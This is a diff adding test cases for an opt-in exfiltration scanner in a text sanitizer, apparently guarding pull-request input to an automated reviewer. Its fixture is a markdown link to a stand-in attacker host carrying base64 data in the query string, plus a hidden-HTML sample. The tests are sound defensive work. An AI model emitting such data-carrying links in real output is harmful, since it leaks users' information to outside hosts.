@@ -177,6 +177,75 @@ describe("sanitize: html=false leaves HTML untouched", () => {
   });
 });
 
+// ─── exfilScan (Layer 3 alone, opt-in) ───────────────────────────────────────
+
+const EXFIL_LINK =
+  "[a](https://evil.example/x?d=SGVsbG8gd29ybGQgbG9uZyBiYXNlNjQgcGF5bG9hZA)";
+
+describe("sanitize: exfilScan detects without splicing", () => {
+  it("flags an exfil-shaped link and leaves the bytes intact", async () => {
+    const input = `text ${EXFIL_LINK} more`;
+    const out = await sanitize(input, { exfilScan: true });
+    assert.equal(out.cleaned, input);
+    assert.deepEqual(out.found, [CATEGORY.EXFIL_URLS]);
+    // A note, not a warning: Layer 3 is detective — it reports the URL and
+    // leaves the bytes in place, so it belongs in the lower severity tier.
+    assert.deepEqual(out.warnings, []);
+    assert.equal(out.notes.length, 1);
+    assert.match(out.notes[0], /URLs shaped like data exfiltration/);
+  });
+
+  it("does not run Layer 3 unless requested (html=false default)", async () => {
+    const input = `text ${EXFIL_LINK} more`;
+    const out = await sanitize(input);
+    assert.deepEqual(out, {
+      cleaned: input,
+      found: [],
+      warnings: [],
+      notes: [],
+    });
+  });
+
+  it("does not flag an ordinary link (precision: no finding on benign input)", async () => {
+    const input = "see [the docs](https://example.com/guide) for details";
+    const out = await sanitize(input, { exfilScan: true });
+    assert.deepEqual(out, {
+      cleaned: input,
+      found: [],
+      warnings: [],
+      notes: [],
+    });
+  });
+
+  it("html: true still implies the scan (exfilScan defaults to html)", async () => {
+    const out = await sanitize(`x ${EXFIL_LINK}`, { html: true });
+    assert.ok(out.found.includes(CATEGORY.EXFIL_URLS));
+  });
+
+  it("html: true implies the scan even when exfilScan is explicitly false", async () => {
+    const out = await sanitize(`x ${EXFIL_LINK}`, {
+      html: true,
+      exfilScan: false,
+    });
+    assert.ok(out.found.includes(CATEGORY.EXFIL_URLS));
+  });
+
+  // The PR-review input script (.github/scripts/sanitize-pr-input.mjs) rests
+  // its byte-faithful-diff guarantee on this: `exfilScan` is the first way to
+  // enter the markdown pipeline with `html: false`, so Layer 2 running whenever
+  // the pipeline runs would silently corrupt every reviewed diff. The other
+  // cases here feed link-only input and would stay green through that mistake.
+  it("exfilScan alone never splices HTML (html: false keeps the bytes)", async () => {
+    // Separate blocks on purpose: a link trailing raw HTML on the SAME line is
+    // swallowed by the HTML block and never parsed as a link, which would make
+    // this case assert nothing about Layer 3.
+    const input = `<!-- note --><span hidden>SECRET</span>\n\n${EXFIL_LINK}`;
+    const out = await sanitize(input, { exfilScan: true });
+    assert.equal(out.cleaned, input);
+    assert.deepEqual(out.found, [CATEGORY.EXFIL_URLS]);
+  });
+});
+
 // ─── options robustness / text type validation (facade contract) ────────────
 
 describe("sanitize: options robustness and text-type validation", () => {
